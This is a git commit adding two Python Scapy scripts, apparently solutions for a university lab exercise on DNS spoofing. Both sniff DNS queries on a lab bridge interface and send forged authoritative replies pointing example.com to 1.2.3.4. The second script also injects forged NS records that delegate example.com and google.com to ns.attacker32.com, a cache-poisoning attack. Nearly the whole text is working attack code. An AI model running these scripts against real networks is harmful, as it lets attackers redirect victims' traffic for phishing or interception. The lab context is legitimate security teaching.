8fab874a5fcbe6259c9b2bc3b331460f725d4c77
Sanchit Dass <sanchitd9@gmail.com>
2023-03-02 00:13:40 -0500

    completed lab 7 code

---
+++ lab7/dns_spoof_answer.py
@@ -0,0 +1,25 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+import sys
+
+NS_NAME = "example.com"
+
+def spoof_dns(pkt):
+    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
+        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
+
+        sniffed_ip  = pkt[IP]
+        sniffed_udp = pkt[UDP]
+        sniffed_dns = pkt[DNS]
+
+        ip       = IP(src=sniffed_ip.dst, dst=sniffed_ip.src)
+        udp      = UDP(sport=53, dport=sniffed_udp.sport)
+        Anssec   = DNSRR(rrname=sniffed_dns.qd.qname, type="A", ttl=259200, rdata="1.2.3.4")
+        dns      = DNS(id=sniffed_dns.id, qd=sniffed_dns.qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, an=Anssec)
+        spoofpkt = ip/udp/dns
+        
+        send(spoofpkt)
+
+myFilter = "udp and dst port 53"
+pkt = sniff(iface="br-9dc788eb17b7", filter=myFilter, prn=spoof_dns)
---
+++ lab7/dns_spoof_ns2.py
@@ -0,0 +1,28 @@
+#!/usr/bin/env python3
+
+from scapy.all import *
+import sys
+
+target  = sys.argv[1]
+NS_NAME = "example.com"
+
+def spoof_dns(pkt):
+    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
+        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
+
+        sniffed_ip  = pkt[IP]
+        sniffed_udp = pkt[UDP]
+        sniffed_dns = pkt[DNS]
+
+        ip       = IP(src=sniffed_ip.dst, dst=sniffed_ip.src)
+        udp      = UDP(sport=53, dport=sniffed_udp.sport)
+        Anssec   = DNSRR(rrname=sniffed_dns.qd.qname, type="A", ttl=259200, rdata="1.2.3.4")
+        Nssec1   = DNSRR(rrname="example.com", type="NS", rdata="ns.attacker32.com", ttl=259200)
+        Nssec2   = DNSRR(rrname="google.com", type="NS", rdata="ns.attacker32.com", ttl=259200)
+        dns      = DNS(id=sniffed_dns.id, qd=sniffed_dns.qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, an=Anssec, ns=Nssec1/Nssec2)
+        spoofpkt = ip/udp/dns
+        
+        send(spoofpkt)
+
+myFilter = "udp and (src host {} and dst port 53)".format(target)
+pkt = sniff(iface="br-9dc788eb17b7", filter=myFilter, prn=spoof_dns)
